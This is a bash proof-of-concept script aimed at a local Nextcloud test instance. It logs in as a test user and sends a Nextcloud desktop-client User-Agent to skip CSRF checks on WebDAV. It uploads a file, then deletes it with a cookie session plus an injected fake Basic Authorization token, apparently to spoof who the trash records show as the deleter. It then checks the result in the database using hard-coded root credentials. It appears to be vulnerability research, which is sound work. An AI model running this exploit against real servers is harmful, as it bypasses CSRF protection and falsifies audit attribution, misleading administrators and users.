#!/bin/bash
set -e
HOST="http://127.0.0.1:31666"
ORIGIN="http://127.0.0.1:31666"
JAR=/tmp/alice_$$.jar
rm -f "$JAR"

# 1) GET /login to seed session + obtain requesttoken
RT=$(/usr/bin/curl -sS -c "$JAR" "$HOST/login" | grep -oE 'data-requesttoken="[^"]+"' | head -1 | cut -d'"' -f2)
echo "[+] requesttoken=$RT"

# 2) POST /login with Origin header (so trustedDomainHelper passes)
LOGIN_HTTP=$(/usr/bin/curl -sS -b "$JAR" -c "$JAR" -X POST "$HOST/login" \
  -H "Origin: $ORIGIN" \
  -H "requesttoken: $RT" \
  --data-urlencode "user=alice" \
  --data-urlencode "password=alice_pw_31666" \
  --data-urlencode "requesttoken=$RT" \
  -o /tmp/login_resp -w "%{http_code} -> %{redirect_url}")
echo "[+] login result: $LOGIN_HTTP"

echo "[+] cookies after login:"
grep -v '^#' "$JAR" | awk '{print $6}' | tr '\n' ' '
echo
echo

# 3) Quick session sanity: hit a session-protected URL
echo "[+] session sanity check on /index.php/apps/files/api/v1/folder-tree:"
/usr/bin/curl -sS -b "$JAR" "$HOST/index.php/apps/files/api/v1/folder-tree?path=/&depth=1" \
  -H "requesttoken: $RT" \
  -H "OCS-APIRequest: true" \
  -w "\n[%{http_code}]\n" | head -c 250
echo
echo

# 4) PUT a file via WebDAV with cookie session (the trick: NC client UA so CSRF is skipped on the DAV path)
NC_CLIENT_UA="Mozilla/5.0 (Linux) mirall/3.10.0"
echo "[+] PUT test file via WebDAV cookie+UA:"
/usr/bin/curl -sS -b "$JAR" -X PUT "$HOST/remote.php/dav/files/alice/spoofvictim.txt" \
  -H "User-Agent: $NC_CLIENT_UA" \
  -H "requesttoken: $RT" \
  --data-binary 'will be spoofed' \
  -w "[%{http_code}]\n"

sleep 2

# 5) DELETE with cookie session + injected Authorization: Basic <base64(SPOOFTOKEN:x)>
SPOOF_TOKEN="SPOOFTOKEN12345"
SPOOF_B64=$(printf '%s:x' "$SPOOF_TOKEN" | base64 -w0)
echo "[+] Spoof DELETE — cookie session + Authorization: Basic $SPOOF_B64"
/usr/bin/curl -sS -b "$JAR" -X DELETE "$HOST/remote.php/dav/files/alice/spoofvictim.txt" \
  -H "User-Agent: $NC_CLIENT_UA" \
  -H "Authorization: Basic $SPOOF_B64" \
  -H "requesttoken: $RT" \
  -w "[%{http_code}]\n"

sleep 2

echo
echo "=== files_trash rows for alice ==="
docker exec nextcloud-db mariadb -uroot -pnc_root_pw nextcloud -e \
  "SELECT id, user, deleted_by, location, timestamp FROM oc_files_trash WHERE user='alice' ORDER BY timestamp DESC LIMIT 5;"
